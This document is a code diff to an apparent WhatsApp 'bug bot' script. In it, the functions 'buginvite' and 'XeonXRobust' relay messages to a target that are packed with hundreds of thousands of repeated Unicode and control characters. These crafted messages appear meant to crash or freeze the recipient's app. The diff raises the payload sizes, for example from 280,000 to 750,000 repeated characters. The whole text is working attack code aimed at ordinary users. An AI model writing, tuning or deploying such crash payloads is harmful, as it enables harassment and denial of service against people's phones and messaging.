@@ -431,8 +431,8 @@ async function buginvite(target, ptcp = true) {
                 message: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: `33333333333333333@newsletter`,
-                        newsletterName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(120000),
-                        jpegThumbnail: "",
+                        newsletterName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦾ".repeat(120000),
+                        jpegThumbnail: o,
                         caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                         inviteExpiration: Date.now() + 1814400000, // 21 hari
                     },
@@ -483,8 +483,8 @@ async function buginvite(target, ptcp = true) {
 }
 		
 async function XeonXRobust(target, Ptcp = true) {
-	const jids = `*_~@13135550002~_*\n`.repeat(10000);
-	const ui = 'ꦽ'.repeat(10000);
+	const jids = `@13135550002\n`.repeat(10000);
+	const ui = 'ꦽ'.repeat(25000);
 	await viper.relayMessage(target, 
 	{
      ephemeralMessage: {
@@ -604,7 +604,7 @@ quotedMessage: {
                     footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                     buttons: [
                         {
-                            buttonId: "\u0003".repeat(280000),
+                            buttonId: "\u0003".repeat(750000),
                             buttonText: {
                                 displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
                             },
